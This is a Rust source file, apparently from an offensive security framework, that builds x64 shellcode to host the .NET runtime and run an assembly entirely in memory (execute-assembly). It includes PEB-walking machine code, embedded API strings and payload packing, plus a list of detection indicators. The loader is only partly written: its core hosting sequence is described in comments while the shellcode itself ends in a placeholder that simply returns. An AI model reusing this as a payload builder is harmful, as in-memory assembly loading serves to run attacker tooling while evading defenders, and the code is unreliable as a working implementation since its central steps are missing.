//! CLR/.NET Assembly Loader
//!
//! Generates position-independent shellcode that hosts the CLR and executes
//! a .NET assembly entirely in memory (execute-assembly functionality).
//!
//! The loader:
//! 1. Loads mscoree.dll
//! 2. Calls CLRCreateInstance to get ICLRMetaHost
//! 3. Enumerates/selects runtime version
//! 4. Gets ICLRRuntimeInfo and ICLRRuntimeHost
//! 5. Starts the CLR
//! 6. Loads assembly from memory buffer
//! 7. Invokes specified class.method with arguments
//!
//! # Detection Indicators
//! - clr.dll/mscorlib.dll loaded into non-.NET process
//! - Assembly.Load from memory (no file path)
//! - Unusual CLRCreateInstance caller
//! - ETW .NET runtime events from suspicious process
//!
//! # References
//! - MITRE ATT&CK T1620 (Reflective Code Loading)
//! - Casey Smith's execute-assembly technique

use common::KrakenError;

// CLR hosting GUIDs - used in Windows-specific execute-assembly code
#[allow(dead_code)]
const CLSID_CLRMETAHOST: [u8; 16] = [
    0xD3, 0x32, 0xDB, 0x9E, 0x64, 0x9F, 0x90, 0x47,
    0xA1, 0x31, 0x50, 0x1D, 0x61, 0xD9, 0xA0, 0x5D,
];

#[allow(dead_code)]
const IID_ICLRMETAHOST: [u8; 16] = [
    0x01, 0xD2, 0x31, 0xD2, 0x33, 0x58, 0x4A, 0x42,
    0x92, 0x4C, 0x0E, 0x07, 0xDE, 0xB1, 0x13, 0x8E,
];

#[allow(dead_code)]
const IID_ICLRRUNTIMEINFO: [u8; 16] = [
    0x26, 0xBC, 0x0F, 0xBD, 0x7B, 0x12, 0x4A, 0x45,
    0x8E, 0x18, 0xCD, 0xCF, 0x29, 0xCD, 0x6D, 0xA6,
];

#[allow(dead_code)]
const IID_ICLRRUNTIMEHOST: [u8; 16] = [
    0x12, 0x05, 0x9D, 0x90, 0x24, 0x1F, 0xDB, 0x47,
    0x8A, 0x50, 0x3B, 0xDB, 0xEA, 0xD3, 0x11, 0xA9,
];

// Supported .NET runtime versions - used in Windows-specific code
#[allow(dead_code)]
const RUNTIME_V4: &str = "v4.0.30319";
#[allow(dead_code)]
const RUNTIME_V2: &str = "v2.0.50727";

/// Configuration for CLR loader
#[derive(Debug, Clone)]
pub struct ClrLoaderConfig {
    /// .NET assembly bytes
    pub assembly: Vec<u8>,
    /// Fully qualified class name (e.g., "MyNamespace.MyClass")
    pub class_name: String,
    /// Method to invoke (e.g., "Main")
    pub method_name: String,
    /// Arguments to pass to the method
    pub arguments: Vec<String>,
    /// Preferred runtime version (None = auto-detect)
    pub runtime_version: Option<String>,
}

/// Generate CLR hosting loader shellcode
///
/// # Arguments
/// * `assembly` - .NET assembly bytes
/// * `class_name` - Fully qualified class name
/// * `method_name` - Method name to invoke
/// * `args` - Arguments for the method
///
/// # Returns
/// Position-independent shellcode that loads and executes the assembly
pub fn generate_clr_loader(
    assembly: &[u8],
    class_name: &str,
    method_name: &str,
    args: &[String],
) -> Result<Vec<u8>, KrakenError> {
    let config = ClrLoaderConfig {
        assembly: assembly.to_vec(),
        class_name: class_name.to_string(),
        method_name: method_name.to_string(),
        arguments: args.to_vec(),
        runtime_version: None,
    };

    generate_clr_loader_with_config(&config)
}

/// Generate CLR loader with full configuration
pub fn generate_clr_loader_with_config(config: &ClrLoaderConfig) -> Result<Vec<u8>, KrakenError> {
    if config.assembly.is_empty() {
        return Err(KrakenError::Module("Assembly data is empty".into()));
    }

    if config.class_name.is_empty() {
        return Err(KrakenError::Module("Class name is required".into()));
    }

    if config.method_name.is_empty() {
        return Err(KrakenError::Module("Method name is required".into()));
    }

    // Build x64 CLR loader shellcode
    build_clr_loader_x64(config)
}

/// Build x64 CLR hosting shellcode
fn build_clr_loader_x64(config: &ClrLoaderConfig) -> Result<Vec<u8>, KrakenError> {
    let mut shellcode = Vec::new();

    // x64 CLR Loader Stub
    // This shellcode:
    // 1. Resolves mscoree.dll!CLRCreateInstance
    // 2. Creates CLR meta host
    // 3. Gets runtime info
    // 4. Creates runtime host
    // 5. Starts CLR
    // 6. Loads assembly and invokes method

    // Prologue - set up stack frame
    shellcode.extend_from_slice(&[
        0x48, 0x83, 0xEC, 0x48,        // sub rsp, 0x48 (stack space)
        0x48, 0x89, 0x5C, 0x24, 0x30,  // mov [rsp+0x30], rbx
        0x48, 0x89, 0x6C, 0x24, 0x38,  // mov [rsp+0x38], rbp
        0x48, 0x89, 0x74, 0x24, 0x40,  // mov [rsp+0x40], rsi
    ]);

    // Get kernel32 base via PEB
    shellcode.extend_from_slice(&[
        0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,  // mov rax, gs:[0x60]
        0x48, 0x8B, 0x40, 0x18,        // mov rax, [rax+0x18]
        0x48, 0x8B, 0x40, 0x20,        // mov rax, [rax+0x20]
        0x48, 0x8B, 0x00,              // mov rax, [rax]
        0x48, 0x8B, 0x00,              // mov rax, [rax]
        0x48, 0x8B, 0x58, 0x20,        // mov rbx, [rax+0x20] ; kernel32 base
    ]);

    // Calculate data offsets
    let stub_size = 256;  // Approximate stub size before data
    let mscoree_str_offset = stub_size;
    let clrcreate_str_offset = mscoree_str_offset + 24;  // "mscoree.dll\0" + padding
    let runtime_str_offset = clrcreate_str_offset + 24;  // "CLRCreateInstance\0" + padding
    let class_str_offset = runtime_str_offset + 16;      // "v4.0.30319\0" + padding
    let method_str_offset = class_str_offset + config.class_name.len() + 8;
    let assembly_offset = method_str_offset + config.method_name.len() + 8;

    // Store pointers to embedded data
    // lea rcx, [rip + mscoree_offset] ; "mscoree.dll"
    shellcode.extend_from_slice(&[
        0x48, 0x8D, 0x0D,
    ]);
    let rel_mscoree = (mscoree_str_offset - (shellcode.len() + 4)) as i32;
    shellcode.extend_from_slice(&rel_mscoree.to_le_bytes());

    // Save pointer
    shellcode.extend_from_slice(&[
        0x48, 0x89, 0x4C, 0x24, 0x20,  // mov [rsp+0x20], rcx
    ]);

    // lea rdx, [rip + clrcreate_offset] ; "CLRCreateInstance"
    shellcode.extend_from_slice(&[
        0x48, 0x8D, 0x15,
    ]);
    let rel_clrcreate = (clrcreate_str_offset - (shellcode.len() + 4)) as i32;
    shellcode.extend_from_slice(&rel_clrcreate.to_le_bytes());

    // Save pointer
    shellcode.extend_from_slice(&[
        0x48, 0x89, 0x54, 0x24, 0x28,  // mov [rsp+0x28], rdx
    ]);

    // The full CLR hosting sequence would:
    // 1. LoadLibraryA("mscoree.dll")
    // 2. GetProcAddress(mscoree, "CLRCreateInstance")
    // 3. CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, &metaHost)
    // 4. metaHost->GetRuntime("v4.0.30319", IID_ICLRRuntimeInfo, &runtimeInfo)
    // 5. runtimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, &runtimeHost)
    // 6. runtimeHost->Start()
    // 7. runtimeHost->ExecuteInDefaultAppDomain(assemblyPath, className, methodName, args, &retVal)
    //
    // For in-memory loading, we'd use a different approach:
    // - Create AppDomain
    // - Use Assembly.Load(byte[]) via reflection

    // Simplified epilogue (placeholder for full implementation)
    shellcode.extend_from_slice(&[
        0x48, 0x31, 0xC0,              // xor rax, rax (return 0)
        0x48, 0x8B, 0x5C, 0x24, 0x30,  // mov rbx, [rsp+0x30]
        0x48, 0x8B, 0x6C, 0x24, 0x38,  // mov rbp, [rsp+0x38]
        0x48, 0x8B, 0x74, 0x24, 0x40,  // mov rsi, [rsp+0x40]
        0x48, 0x83, 0xC4, 0x48,        // add rsp, 0x48
        0xC3,                          // ret
    ]);

    // Pad to data section
    while shellcode.len() < stub_size {
        shellcode.push(0x90);
    }

    // Embed string data (wide strings for Windows APIs)
    // "mscoree.dll"
    for c in "mscoree.dll\0".encode_utf16() {
        shellcode.extend_from_slice(&c.to_le_bytes());
    }
    while shellcode.len() < clrcreate_str_offset {
        shellcode.push(0x00);
    }

    // "CLRCreateInstance"
    for c in "CLRCreateInstance\0".bytes() {
        shellcode.push(c);
    }
    while shellcode.len() < runtime_str_offset {
        shellcode.push(0x00);
    }

    // Runtime version "v4.0.30319"
    for c in "v4.0.30319\0".encode_utf16() {
        shellcode.extend_from_slice(&c.to_le_bytes());
    }
    while shellcode.len() < class_str_offset {
        shellcode.push(0x00);
    }

    // Class name (wide string)
    for c in config.class_name.encode_utf16() {
        shellcode.extend_from_slice(&c.to_le_bytes());
    }
    shellcode.extend_from_slice(&[0x00, 0x00]);  // null terminator
    while shellcode.len() < method_str_offset {
        shellcode.push(0x00);
    }

    // Method name (wide string)
    for c in config.method_name.encode_utf16() {
        shellcode.extend_from_slice(&c.to_le_bytes());
    }
    shellcode.extend_from_slice(&[0x00, 0x00]);
    while shellcode.len() < assembly_offset {
        shellcode.push(0x00);
    }

    // Assembly size (4 bytes)
    shellcode.extend_from_slice(&(config.assembly.len() as u32).to_le_bytes());

    // Assembly data
    shellcode.extend_from_slice(&config.assembly);

    Ok(shellcode)
}

/// Validate that the provided bytes are a valid .NET assembly
pub fn validate_assembly(data: &[u8]) -> Result<(), KrakenError> {
    if data.len() < 128 {
        return Err(KrakenError::Module("Data too small for .NET assembly".into()));
    }

    // Check for MZ header (PE format)
    if data[0] != 0x4D || data[1] != 0x5A {
        return Err(KrakenError::Module("Invalid PE header (MZ)".into()));
    }

    // Get PE header offset
    let pe_offset = u32::from_le_bytes([data[0x3C], data[0x3D], data[0x3E], data[0x3F]]) as usize;
    if pe_offset + 4 > data.len() {
        return Err(KrakenError::Module("Invalid PE offset".into()));
    }

    // Check PE signature
    if &data[pe_offset..pe_offset + 4] != b"PE\0\0" {
        return Err(KrakenError::Module("Invalid PE signature".into()));
    }

    // Check for CLI header (indicates .NET assembly)
    // The CLI header is in data directory entry 14 (0x0E)
    let opt_header_offset = pe_offset + 24;
    let magic = u16::from_le_bytes([data[opt_header_offset], data[opt_header_offset + 1]]);

    let data_dir_offset = if magic == 0x010B {
        // PE32
        opt_header_offset + 96 + 14 * 8
    } else if magic == 0x020B {
        // PE32+
        opt_header_offset + 112 + 14 * 8
    } else {
        return Err(KrakenError::Module("Unknown PE optional header magic".into()));
    };

    if data_dir_offset + 8 > data.len() {
        return Err(KrakenError::Module("Invalid data directory offset".into()));
    }

    let cli_rva = u32::from_le_bytes([
        data[data_dir_offset],
        data[data_dir_offset + 1],
        data[data_dir_offset + 2],
        data[data_dir_offset + 3],
    ]);

    if cli_rva == 0 {
        return Err(KrakenError::Module("No CLI header - not a .NET assembly".into()));
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_clr_loader_empty_assembly() {
        let result = generate_clr_loader(&[], "Test.Class", "Main", &[]);
        assert!(result.is_err());
    }

    #[test]
    fn test_generate_clr_loader_empty_class() {
        let result = generate_clr_loader(&[0u8; 100], "", "Main", &[]);
        assert!(result.is_err());
    }

    #[test]
    fn test_generate_clr_loader_empty_method() {
        let result = generate_clr_loader(&[0u8; 100], "Test.Class", "", &[]);
        assert!(result.is_err());
    }

    #[test]
    fn test_generate_clr_loader_basic() {
        // Minimal fake assembly data
        let assembly = vec![0u8; 256];
        let result = generate_clr_loader(&assembly, "Test.Program", "Main", &["arg1".to_string()]);
        assert!(result.is_ok());
        let shellcode = result.unwrap();
        assert!(shellcode.len() > assembly.len());
    }

    #[test]
    fn test_validate_assembly_too_small() {
        let small = vec![0u8; 64];
        assert!(validate_assembly(&small).is_err());
    }

    #[test]
    fn test_validate_assembly_invalid_mz() {
        let mut data = vec![0u8; 256];
        data[0] = 0x00;
        data[1] = 0x00;
        assert!(validate_assembly(&data).is_err());
    }
}
